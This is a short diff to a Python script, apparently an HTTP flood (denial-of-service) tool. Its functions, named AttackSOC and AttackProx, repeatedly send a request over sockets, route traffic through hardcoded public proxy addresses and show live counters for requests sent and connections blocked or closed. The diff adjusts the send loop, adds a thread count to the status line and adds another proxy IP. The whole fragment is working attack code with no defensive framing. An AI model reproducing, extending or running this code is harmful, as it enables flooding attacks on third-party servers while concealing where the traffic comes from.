@@ -46,10 +46,11 @@ def AttackSOC(req):
     while True:
         try:
             try:
-                for _ in range(100):
+                for _ in range(1):
                     s.send(str.encode(req))
                     rs = rs + 1
-                    print("" + Fore.LIGHTCYAN_EX + f"Sent: {rs} Blocked: {closed} Closed: {closed}" + Fore.RESET + "", end='\r')
+                    active = threading.active_count()
+                    print("" + Fore.LIGHTCYAN_EX + f"Sent: {rs} Active Threads: {active} Blocked: {closed} Closed: {closed}" + Fore.RESET + "", end='\r')
             except:
                 closed = closed + 1
                 s.close()
@@ -64,6 +65,7 @@ def AttackProx(req):
     s = socks.socksocket()
     s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
     s.set_proxy(socks.HTTP)
+    s.default_proxy(proxy_type=1, addr='50.174.7.157', port=80)
 #    socks.set_default_proxy(proxy_type=2, addr='72.195.34.59', port=4145)
     s.connect((str(host), int(80)))
     s.settimeout(5)
@@ -79,7 +81,7 @@ def AttackProx(req):
                 closed = closed + 1
                 s.close()
         except:
-            pass
+            pass            
 
 
 # def AttackProx(req):
